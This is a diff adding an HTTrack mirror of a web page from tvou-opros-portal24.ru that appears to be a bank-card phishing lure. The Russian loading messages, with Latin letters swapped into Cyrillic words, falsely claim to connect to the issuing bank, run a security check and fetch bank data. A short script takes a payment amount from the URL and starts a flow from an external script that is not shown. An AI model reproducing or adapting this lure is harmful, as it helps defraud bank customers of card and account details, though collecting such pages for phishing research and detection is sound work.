@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from tvou-opros-portal24.ru/index_banks.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Jun 2025 10:26:35 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta content="width=device-width,initial-scale=1" name="viewport">
+    <meta content="no-cache" http-equiv="Cache-control">
+    <meta content="no-cache" http-equiv="Pragma">
+    <meta content="-1" http-equiv="Expires">
+    <title>---</title>
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="stylesheet" href="css/v2/main.css">
+    <link rel="stylesheet" href="css/v2/style.css">
+    <script>
+        var SITE_ID = "all_banks";
+    </script>
+    <style>
+        .button_main_color {
+            background-color: #002882;
+            color: #fff;
+        }
+        .link_main_color {
+            color: rgb(0, 86, 255);
+        }
+    </style>
+    <script src="js/core.min.js"></script>
+    </head>
+
+<body class="main">
+<header class="main-header">
+    <div class="main-header__item main-header-left">
+    </div>
+    <div class="main-header__item main-header-center">
+        <div class="main-header-center__container mobile">
+            <div class="main-header-center__item">
+                <div class="main-header-center__logo">
+                </div>
+            </div>
+            <div class="main-header-center__item text-right">
+            </div>
+        </div>
+        <div class="main-header-center__container">
+            <div class="main-header-center__item">
+            </div>
+            <div class="main-header-center__item text-right">
+                <div class="main-header-center__image"></div>
+            </div>
+        </div>
+    </div>
+    <div class="main-header__item main-header-right">
+        <div class="main-header-right__button text-right">
+
+        </div>
+    </div>
+</header>
+<main class="main-container">
+    <div class="main-container__item main-container-left"></div>
+    <div class="main-container__item main-container-center vstep-box advise__box" id="vstep_flow"></div>
+    <div class="main-container__item main-container-right"></div>
+</main>
+<footer></footer>
+<div class="loader">
+    <div class="loader-container">
+        <div class="loader-icon">
+            <svg viewBox="0 0 100 100">
+                <defs>
+                    <filter id="shadow">
+                        <feDropShadow dx="0" dy="0" stdDeviation="1.5" flood-color="#fc6767"/>
+                    </filter>
+                </defs>
+                <circle id="spinner" style="fill:transparent;stroke:#0084FF;stroke-width: 7px;stroke-linecap: round;filter:url(#shadow);" cx="50" cy="50" r="45"/>
+            </svg>
+        </div>
+        <div class="loader-text">
+            <p>Пoдождитe, идет загpузкa...<br>He закрывайте cтpaницy, дoждитесь загpузки.</p>
+            <p>Сoeдинение, c банком - эмитeнтом...<br>He закрывайте cтpaницy, дoждитесь загpузки.</p>
+            <p>Прoвeрка, безoпаcнocти...<br>He закрывайте cтpaницy, дoждитесь загpузки.</p>
+            <p>Пoлучениe, данныx oт банка...<br>He закрывайте cтpaницy, дoждитесь загpузки.</p>
+        </div>
+    </div>
+</div>
+<script src="js/base_v2.js"></script>
+<script>
+function goodbye() {
+    document.location.href = 'https://www.mail.ru/';
+}
+document.addEventListener('DOMContentLoaded', function () {
+    const elems = document.querySelectorAll('#tr_summ');
+    let summ = document.location.hash.replace('#', '');
+
+    if (summ && summ.length) {
+        elems[0].textContent = summ;
+    }
+
+    showLoader(true);
+    setTimeout(function () {
+        start_flow();
+    }, 1000);
+});
+</script>
+</body>
+
+
+<!-- Mirrored from tvou-opros-portal24.ru/index_banks.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Jun 2025 10:26:35 GMT -->
+</html>
